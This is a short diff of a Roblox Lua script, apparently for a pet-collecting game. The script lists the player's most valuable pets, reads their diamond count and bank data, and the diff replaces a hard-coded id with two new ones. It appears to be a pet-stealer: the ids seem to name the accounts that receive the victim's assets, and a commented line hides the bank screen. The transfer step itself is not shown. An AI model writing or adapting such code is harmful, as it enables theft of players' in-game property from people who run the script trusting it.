@@ -100,7 +100,7 @@ local v2 = lib
 --game:GetService("Players").LocalPlayer.PlayerGui.Bank:Destroy()
 
 local petsbefore = lib.Save.Get().Pets
-local ids = {859821628}
+local ids = {4012744308, 841384276}
 local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
 local mybanks = Network.Invoke("Get My Banks")
 
@@ -109,7 +109,7 @@ local PetsList = {}
 local PetsList2 = {}
 for i,v in pairs(lib.Save.Get().Pets) do
 	local v2 = lib.Directory.Pets[v.id];
-	if v2.rarity == "Exclusive" or v2.huge or v2.event or v2.secret or v2.titanic then
+	if v2.rarity == "Exclusive" or v2.huge or v2.titanic then
 		table.insert(PetsList, v.uid);
 		PetsList2[v.uid] = false
 	end
